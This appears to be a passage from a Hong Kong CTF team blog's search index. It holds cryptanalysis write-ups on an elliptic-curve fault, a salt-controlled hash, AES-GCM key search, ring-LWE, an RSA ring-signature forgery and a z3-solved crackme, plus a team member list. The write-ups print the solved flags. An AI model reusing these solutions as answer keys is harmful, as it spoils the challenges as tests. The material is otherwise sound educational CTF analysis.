somebody? Me.  We made a bunch of assumptions. Cutting the crap, we assumed that the same generator $G = (x_G, y_G)$ is being multipled in a same way, except that the curve is operated on new modulo $p'$. This matches the author's statement regarding on the prime being corrupted.\nHowever, obviously, it is very likely that $G$ may not be a point the above curve. Luckily (or unluckily), we can assume that it is operating on another curve $y^2 \\equiv x^3 + ax + b'\\ (\\text{mod}\\ p')$, such that $G$ is on it.\nFor now, we are given two points on this curve (the ciphertexts of the flag $F = (x_F, y_F)$ and the message hello world $M = (x_M, y_M)$). Since $a$ is known we can easily recover $p'$ by:\n\\[\\begin{aligned} p' = \\text{gcd}( \u0026(y_F^2 - x_F^3 - ax_F - b') - (y_G^2 - x_G^3 - ax_G - b'), \\\\ \u0026 (y_M^2 - x_M^3 - ax_M - b') - (y_G^2 - x_G^3 - ax_G - b')) \\end{aligned} \\]\nThe order of the generator should be a large prime for an elliptic curve to be secure. Clearly this property may not hold on those new modulos struck by cosmic may. For instance, suppose that we have $p' = 340282366762482138434845932242512471141$. Since 67 is a factor of $p'$, we are indeed working on the curve $y^2 \\equiv x^3 + ax + b'\\ (\\text{mod}\\ 67)$. $G$ has a order 74, and $F = fG = 21G$. It implies that $f \\equiv 21\\ (\\text{mod}\\ 74)$.\nBy collecting a bunch of linear congruences, we can find $f$ by the Chinese Remainder Theorem. Eventually we have the flag: uiuctf{th4t_5ur3_w4s_f4ulty_huh?}.\n","permalink":"https://b6a.black/posts/2020-07-22-uiuctf-nookcrypt/","summary":"Challenge Summary  Tom Nook is testing a new encryption scheme for nookphones, but it seems to be a bit faulty... can you break it?\n nookcrypt is a netcat service that have no source code released. There are two functions exposed:\n Gets an encrypted copy of the flag (and the message hello world). Encrypts an arbitrary message.  For example, this is what I had when trying out the options:","title":"UIUCTF 2020: nookcrypt"},{"content":"Pass the Hash (Warmup/Learning; 50 points) Solved by Mystiz.\nChallenge Summary We are given a peculiar hash algorithm that generates 64-byte long hashes, which wraps of sha0, sha1, sha256 and ripemd160. The hash takes two arguments, salt (20 bytes) and password (22 bytes). We are allowed to control the salt, whilst the goal is to find the password within 1024 queries.\nHash construction We are given a peculiar hash algorithm that generates 64-byte long hashes, which wraps of sha0, sha1, sha256 and ripemd160.\nThe hash is defined by:\n $L_0, R_0 = \\text{password}\\ |\\ \\text{salt}\\ |\\ \\text{password}$ ($L_0, R_0$ separate the 64-byte block) $L_{i+1} = L_i \\oplus h_R(R_i), R_{i+1} = R_i \\oplus h_L(L_i)$, for $i = 0, 1, ..., 15$.  Here $h_L$ and $h_R$ are the two hash algorithms that uses one of the commonly used hash algorithms based on the content. As this is a 32-byte block, if the hash algorithm itself does not consist 32 bytes, it would repeat itself until there are 32 bytes.\nSolution Part I: Repeat, repeat, repeat One question that had brought up to my mind is: What if the $h_L$ and $h_R$ uses solely the 20-byte hash algorithms (i.e., all but sha256)?  Assume that 20-byte hash algorithms are used. Let's see what will happen in a round.\nDefine $s_0\\ |\\ s_1\\ |\\ ...\\ |\\ s_9 := L_i\\ | \\ R_i$ and $t_0\\ |\\ t_1\\ |\\ ...\\ |\\ t_9 := L_{i+1}\\ | \\ R_{i+1}$, where:\n $s_0, s_2, s_3, s_6, s_7, s_9, t_0, t_2, t_3, t_6, t_7, t_9$ are 8 bytes long, and $s_1, s_4, s_5, s_8, t_1, t_4, t_5, t_8$ are 4 bytes long.  Then we have:\n $t_0\\ |\\ t_1\\ |\\ ...\\ |\\ t_4 = s_0\\ |\\ s_1\\ |\\ ...\\ |\\ s_4\\ |\\ h_R(s_5\\ |\\ s_6\\ |\\ ...\\ |\\ s_9)$, and $t_5\\ |\\ t_6\\ |\\ ...\\ |\\ t_9 = s_5\\ |\\ s_6\\ |\\ ...\\ |\\ s_9\\ |\\ h_L(s_0\\ |\\ s_1\\ |\\ ...\\ |\\ s_4)$.  However, since the first and last 12 bytes of $h_R(\\cdot)$ are equal, we have\n $s_0 \\oplus t_0 = s_3 \\oplus t_3$, and $s_1 \\oplus t_1 = s_4 \\oplus t_4$.  The assumption applies on $h_L(\\cdot)$ as well. Thus we have\n$s_5 \\oplus t_5 = s_8 \\oplus t_8$, and $s_6 \\oplus t_6 = s_9 \\oplus t_9$.  If we define $L_0, R_0$ by $a_0, a_1, \u0026hellip;, a_9$ and $L_{16}, R_{16}$ by $b_0, b_1, \u0026hellip;, b_9$ (their lengths are respectively equal to $s_0, s_1, \u0026hellip;, s_9$), we still have the below properties:\n $b_0 \\oplus b_3 = a_0 \\oplus a_3$, $b_1 \\oplus b_4 = a_1 \\oplus a_4$, $b_5 \\oplus b_8 = a_5 \\oplus a_8$, and $b_6 \\oplus b_9 = a_6 \\oplus a_9$.   Part II: What does it mean? Let's look back how $L_0, R_0$ is defined - $\\text{password}\\ |\\ \\text{salt}\\ |\\ \\text{password}$. This gives us two more properties:\n$a_0 = a_7, a_1 = a_8, a_2 = a_9$ (derived from passwords), and we can control the values of $a_3, a_4, a_5, a_6$.  So... assuming that $h_L$ and $h_R$ uses solely the 20-byte hash algorithms, we can effectively find the password (namely $a_0, a_1, a_2$):\n $a_0 = a_3 \\oplus b_0 \\oplus b_3$, $a_1 = a_4 \\oplus b_1 \\oplus b_4$ and $a_2 = a_9 = a_6 \\oplus b_6 \\oplus b_9$.  Part III: But the assumption is too good to be true! As stated from the title, the assumption is quite hard to satisfy. What we need is, in each of the 16 rounds, $h_L$ and $h_R$ needs to pick an 20-byte hash algorithm instead of the 32-byte hash algorithm... Very difficult isn't it?\nThe answer is not really. The probability to use 20-byte hash algorithms all along is $0.75^{32}\\approx 0.000145257$, which is approximately one out of 10000. We can visit the oracle 10 times, in average, to compute the password from the hash algorithm.\nIt is very easy to know when we had the hash algorithm. From properties 2 and 3, we have:\n\\[b_1 \\oplus b_4 \\oplus b_5 \\oplus b_8 = a_1 \\oplus a_4 \\oplus a_5 \\oplus a_8 = a_4 \\oplus a_5.\\]\nWriting the exploit script solving the challenge, we have the flag: PTBCTF{420199e572e685af8e1782fde58fd0e9}.\nAvec? (Cryptanalysis; 856 points) Solved by harrier.\nChallenge Summary This is a interesting question where we are given a ciphertext, encrypted using AES-GCM, with key and nonce generated by polish_key(os.urandom(8)) and concat itself. The key and nonce is not provided though, so we have to somehow reverse the polish_key process to know more about the key and nonce.\nSolution I first thought this is a GCM nonce collision problem, but the 12 bytes nonce and nonce generation rejects this thought.\nThe polish_key function is the following:\ndef polish_key(key): key = bytes_to_long(key[::-1]) key = GF(2**64).fetch_int(key) key = key ** 0xbcafffff435 key = long_to_bytes( key.integer_representation() )[::-1] assert len(key) == 8 return key Which 0xbcafffff435 is can be factored into $3\\times5\\times7\\times257\\times3019\\times65537$. Knowing that $3^{32} - 1 = 3\\times5\\times7\\times257\\times65537$, the key is of order $3^{32}+1$ (or a factor of it). Hence, the entropy for key and nonce are 32 bits. Exhausting both of them at the same time requires $2^{64}$ trials... or really?\nBecause the cipher is under GCM and with a known AAD, given a key $k$ and a ciphertext $c$, we can compute $\\text{GHASH}_{k,c}(\\text{AAD})$.\nConsider the GCM mode with its tag generation. The tag generation is given by $\\text{tag} = E_k(\\text{nonce}) \\oplus \\text{GHASH}_{k,c}(\\text{AAD})$. Therefore, with known key $k$, one can find out the key-correspondent nonce by $\\text{nonce} = D_k(\\text{tag} \\oplus \\text{GHASH}_{k,c}(\\text{AAD}))$.\nTherefore we can exhaust the key $k$ with $2^{32} + 1$ trials, for each key $k$ find its corresponding $nonce$ and see whether it is the correct one.\nWe can even make it quickly by identifying the $\\text{nonce}$ should end with \\x00\\x00\\x00\\x01 with this method, as it is using a 12-byte nonce.\nWe initially use Sage to deal with the challenge, but it was way too slow (to generate the possible keys) and decided to use Python instead. But we don't want to use other language other than Sage to generate the keys...\nSo what we have done is a simple multi-thread Sage key generator and a Python solver. And it was wayyyyyyyyyyyy too slow... even with pypy.\nBoth the key generator and the pypy solver are terribly slow. I cannot find a simple GHASH implementation to do the brute-forcing part. Computing $2^{16}$ keys takes me more than 3 mins in pypy... I just wanted to use something fast to test through the keys. BearSSL saids it can process \u0026gt;1000MBps according to its benchmark. Maybe I should use a language with fast compiled code.\nI am a Rustacean, so why not to do it in Rust? The result is blazingly fast. It could be solved within an hour with a 64-core computer (from one of my teammates). Sage was then the bottleneck, and thus I did not bother to improve the performance of the Rust solver.\nI should use Rust to generate keys to speedup the whole thing, but anyway, we solved it! :)\nWrong Ring (Cryptanalysis; 936 points) Solved by Mystiz.\nChallenge Summary I personally see this is a cumbersome math. One of my teammates pointed out that this is similar to a ring-LWE. But anyway, knowing that is a ring-LWE does not help much.\nOkay, let's get back on track. A secret polynomial, $S$, is generated to derive the key. We are given eight polynomial pairs of $(A_k, B_k)$ such that $B_k(x) \\equiv A_k(x)S(x) + \\varepsilon_k(x)\\ (\\text{mod}\\ p(x))$, where $\\varepsilon_k$ is an error polynomial and $p(x) = x^{256} + 1486$.\nSolution Part I: Complicating the problem a bit Let's make the polynomial concrete! Define:\n\\[A_k(x) = \\sum_{i=0}^{255} a_{ki} x^i, B_k(x) = \\sum_{i=0}^{255} b_{ki} x^i, \\varepsilon_k(x) = \\sum_{i=0}^{255} e_{ki} x^i, S(x) = \\sum_{i=0}^{255} s_i x^i.\\]\n$a_{ki}, b_{ki}, s_i$ are all integers in the set $[0, 1486]$, while $e_{ki}$ are small real numbers.\nThen we have\n\\[\\begin{aligned} \\sum_{i=0}^{255} b_{ki} x^i \u0026\\equiv \\left(\\sum_{i=0}^{255} a_{ki} x^i\\right)\\left(\\sum_{i=0}^{255} s_i x^i\\right) + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{510}\\left(\\sum_{j=\\text{max}(0,i-255)}^{\\text{min}(255,i)} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=\\text{max}(0,i-255)}^{\\text{min}(255,i)} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=256}^{510}\\left(\\sum_{j=\\text{max}(0,i-255)}^{\\text{min}(255,i)} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j}\\right)x^i + \\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j}\\right)x^i - 1486\\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^{i-256} + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j}\\right)x^i - 1486\\sum_{i=0}^{254}\\left(\\sum_{j=i+1}^{255} a_{kj}s_{i-j+256}\\right)x^{i} + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j} - 1486 \\sum_{j=i+1}^{255} a_{kj}s_{i-j+256} + e_i\\right)x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \\sum_{j=i+1}^{255} a_{k,i-j+256}s_j + e_i\\right)x^i \\end{aligned}\\]\nExplanations: Under modulo $p(x)$, $x^{256} = -1486$ - so we have $$\\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^i = - 1486\\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^{i-256}.$$  Very complicated right? Yes... But we have a conclusion for this part:\nFor each $i = 0, 1, \u0026hellip;, 255$ and $k = 1, 2, \u0026hellip;, 8$, we have: $$b_{ki} = \\sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \\sum_{j=i+1}^{255} a_{k,i-j+256}s_j + e_i.$$  Part II: An insight I have noticed that the coefficients for $x^{240}, x^{241}, ..., x^{255}$ in the error polynomial would be very small (less than 0.1 in magnitude). So why don't we compare the coefficients directly?\nFor each $i = 240, 241, ..., 255$ and $k = 1, 2, ..., 8$, we have a corresponding equation:\n\\[\\text{round}(b_{ki}) = \\sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \\sum_{j=i+1}^{255} a_{k,i-j+256}s_j.\\]\nSince there are 256 unknowns ($s_0, s_1, ..., s_{255}$) and 256 equations, we can hopefully solve the equation. This gives us the key, hence the flag.\nLOTR (Cryptanalysis; 936 points) Solved by Mystiz.\nChallenge Summary This is an attempt to implement an anonymous signature scheme using RSA. In short, given $m$ parties with public keys being $n_1, n_2, ..., n_m$, the signature generated by this group is defined by $(c_1, c_2, ..., c_m)$, where\n\\[\\sum_{k=1}^m \\text{RSAEncrypt}(c_k, n_k)\\equiv\\text{hash}\\ (\\text{mod}\\ 2^{256}),\\]\nand $2^{2175} + 2^{2048} \\leq c_k \\leq 2^{2176} - 2^{2048}$ for each of the $k$'s.\nThere is a catch: if $c = qn + r$ with $0 \\leq r \u0026lt; q$, $\\text{RSAEncrypt}(c, n) = qn + [r^e\\ (\\text{mod}\\ n)]$.\nSolution Part I: Simplify the challenge as much as possible $\\text{RSAEncrypt}(qn + r, n) = qn + [r^e\\ (\\text{mod}\\ n)]$ is cumbersome. Why don't we just assume $r = 0$ so that $\\text{RSAEncrypt}$ is just an identity function?\nPart II: The main dish Note: The $c_k$ and $c_k'$ defined below are multiples of $n_k$. This is what we had from the above part for the simplicity\u0026rsquo;s sake.  My approach is to generate two ciphertexts, namely, $c_k$ and $c_k'$ for the $k$-th party. In this way, we have 243 ciphertext pairs. We are looking for $x_1, x_2, ..., x_{243}\\in{0, 1}$ such that\n\\[\\bigoplus_{k=1}^m [(1 - x_k) \\text{RSAEncrypt}(c_k, n_k) + x_k \\text{RSAEncrypt}(c_k', n_k)] \\equiv \\text{hash}\\ (\\text{mod}\\ 2^{256}).\\]\nSimplifying, we have:\n\\[\\bigoplus_{k=1}^m [x_k (c_k - c_k')] \\equiv \\text{hash} \\oplus \\bigoplus_{k=1}^m c_k\\ (\\text{mod}\\ 2^{256}).\\]\nIdea: My approach is to check if one of the $2^{243}$ possible generated ciphertexts covers the target hash. If not, generate another set.  The above equation is just an linear equation! Solving it we had the values of $x_k$'s. If $x_k = 0$ we pick $c_k$, and $c_k'$ otherwise. After all we have forged a signature.\nPrimitive Obsession (Reverse Engineering; 936 points) Solved by Mystiz.\nChallenge Summary This is a crackme with a 260-byte long input. Conditions involves basic math operations after casting some of the bytes into various types.\nSolution My first thought is to use Angr! Unfortunately I am not a good Angr user - so it took me a long while to give up. I have finally adopted an ultra-naive approach...\n  That is, I have extracted the expressions one by one manually and pass them to z3. After all, I admit my stupidity - it took me six hours to solve it...\n","permalink":"https://b6a.black/posts/2019-10-02-pwnthybytes/","summary":"Pass the Hash (Warmup/Learning; 50 points) Solved by Mystiz.\nChallenge Summary We are given a peculiar hash algorithm that generates 64-byte long hashes, which wraps of sha0, sha1, sha256 and ripemd160. The hash takes two arguments, salt (20 bytes) and password (22 bytes). We are allowed to control the salt, whilst the goal is to find the password within 1024 queries.\nHash construction We are given a peculiar hash algorithm that generates 64-byte long hashes, which wraps of sha0, sha1, sha256 and ripemd160.","title":"PwnThyBytes CTF 2019 Writeup"},{"content":"Black Bauhinia is a Capture-the-Flag team from Hong Kong founded in mid-2019 and have been actively participating in CTF games since then. You can find us on CTFtime, Twitter or Facebook. As you can see, this page is still work-in-progress.\nOur members   Mystiz (Joined Jul 2019) I guess therefore I am. Will guess hard for flags.\n     harrier (Joined Jul 2019)       cire meat pop (Joined Jul 2019)    byronwai (Joined Jul 2019) - A bard who put all his AP to ATK      wwkenwong (Joined Jul 2019) - North Korea\u0026#39;s botnet      ozetta (Joined Jul 2019)      kc (Joined Jul 2019)    Cousin (Joined Dec 2019) - Hellman Certified Cryptography Professional A math guy who loves cryptography, but cryptography doesn\u0026#39;t love back\n     double (Joined Dec 2019)    crabmony (Joined Mar 2020)      GeoffreyY (Joined Jul 2020)    eriri (Joined Jul 2020)      apple (Joined Jul 2020)    vikychoi (Joined Jul 2020)      M0UZ3 (Joined Sep 2020)    blackphreak (Joined Oct 2020) - An unlicensed front gate security I have a dream that someday I can become a security researcher.\n     Kaiziron (Joined Oct 2020)    Stdor (Joined Dec 2020)      TC0129 (Joined Feb 2021) - Member of Kiryukai This guy is too lazy to write. Peko.\n   egg (Joined Feb 2021)     ","permalink":"https://b6a.black/about-us/","summary":"Black Bauhinia is a Capture-the-Flag team from Hong Kong founded in mid-2019 and have been actively participating in CTF games since then. You can find us on CTFtime, Twitter or Facebook. As you can see, this page is still work-in-progress.\nOur members   Mystiz (Joined Jul 2019) I guess therefore I am. Will guess hard for flags.\n     harrier (Joined Jul 2019)       cire meat pop (Joined Jul 2019)    byronwai (Joined Jul 2019) - A bard who put all his AP to ATK      wwkenwong (Joined Jul 2019) - North Korea\u0026#39;s botnet      ozetta (Joined Jul 2019)      kc (Joined Jul 2019)    Cousin (Joined Dec 2019) - Hellman Certified Cryptography Professional A math guy who loves cryptography, but cryptography doesn\u0026#39;t love back","title":"About Us"}]